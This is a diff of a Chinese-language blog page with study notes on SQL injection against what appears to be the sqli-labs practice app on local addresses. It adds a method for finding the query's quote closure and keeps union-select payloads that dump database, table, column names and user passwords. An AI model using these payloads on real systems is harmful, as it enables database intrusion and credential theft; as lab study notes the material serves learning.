@@ -35,9 +35,10 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1703069750179-fe5bc20e-1cd6-48d9-b5ea-46b563d5db2a.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1703069848695-4faa3b3a-bccf-4d3f-8cca-d9f512e0e69e.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1703069908013-7031cecd-4a59-407b-b185-5b3f1edfa195.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1703593865621-9dbcf61b-28de-4a1a-a28a-0ee48725f637.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1703472721169-680fdfd7-458b-45ad-bd7a-c4a064fc8d57.png">
 <meta property="article:published_time" content="2023-12-24T01:01:44.000Z">
-<meta property="article:modified_time" content="2023-12-25T02:57:34.202Z">
+<meta property="article:modified_time" content="2024-01-01T12:20:19.579Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1703069625151-b83aa1bb-10ca-48c4-90d9-c9e9f6be84da.png">
@@ -209,7 +210,11 @@
 </ol>
 <p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1703069908013-7031cecd-4a59-407b-b185-5b3f1edfa195.png" alt="img"></p>
 <p>​                                                                     </p>
-<h1 id="二、sql注入相关知识w"><a href="#二、sql注入相关知识w" class="headerlink" title="二、sql注入相关知识w"></a>二、sql注入相关知识w</h1><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p><a target="_blank" rel="noopener" href="http://192.168.0.109:83/Less-1/?id=2">http://192.168.0.109:83/Less-1/?id=2</a>‘ and 1&#x3D;2 union select 1,group_concat(schema_name),3 from information_schema.schemata   爆数据库</p>
+<h1 id="二、sql注入相关知识w"><a href="#二、sql注入相关知识w" class="headerlink" title="二、sql注入相关知识w"></a>二、sql注入相关知识w</h1><h3 id="找闭合大法"><a href="#找闭合大法" class="headerlink" title="找闭合大法"></a>找闭合大法</h3><p>第一步，输入?id&#x3D;1,会显示正确的回显</p>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1703593865621-9dbcf61b-28de-4a1a-a28a-0ee48725f637.png" alt="img"></p>
+<p>第二步，?id&#x3D;1’,加个单引号看结果，如果报错，说明闭合和’ 有关系，如果依然是一个正确的回显，那就说明闭合和’ 没有关系，换双引号”试试?id&#x3D;1”,同理判断。如果都报错，则说明闭合为空</p>
+<p>第三步，假设闭合和’有关系,用?id&#x3D;1’– - 或者?id&#x3D;1’ and ‘1’&#x3D;’1 消耗掉后面的单引号，如果显示正确的回显，则说明’ 就是闭合，如果显示错误的回显，则在单引号后面加个括号试试 ?id&#x3D;1’)– -,或者加其他闭合符号，显示正确的回显即说明闭合成功。</p>
+<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p><a target="_blank" rel="noopener" href="http://192.168.0.109:83/Less-1/?id=2">http://192.168.0.109:83/Less-1/?id=2</a>‘ and 1&#x3D;2 union select 1,group_concat(schema_name),3 from information_schema.schemata   爆数据库</p>
 <p><a target="_blank" rel="noopener" href="http://192.168.2.70/sqli/Less-1/?id=-1%27union">http://192.168.2.70/sqli/Less-1/?id=-1&#39;union</a> select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema&#x3D;database()– -  爆表名</p>
 <p>select 1,group_concat(column_name) ,3 from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;database();  爆字段</p>
 <p><a target="_blank" rel="noopener" href="http://192.168.2.70/sqli/Less-1/?id=-1%27union">http://192.168.2.70/sqli/Less-1/?id=-1&#39;union</a> select 1,group_concat(id,”<del>“,username,”</del>“,password),3 from users;– -     爆内容</p>
@@ -500,7 +505,7 @@
             
             <div>
                 <span class="icon-copyright"></span>
-                2020-2023
+                2020-2024
                 <span class="footer-info-sep"></span>
                 John Doe
             </div>
@@ -513,10 +518,10 @@
             
                 <div>
                     <span class="icon-brush"></span>
-                    18.6k
+                    19.3k
                     &nbsp;|&nbsp;
                     <span class="icon-coffee"></span>
-                    01:17
+                    01:19
                 </div>
             
             
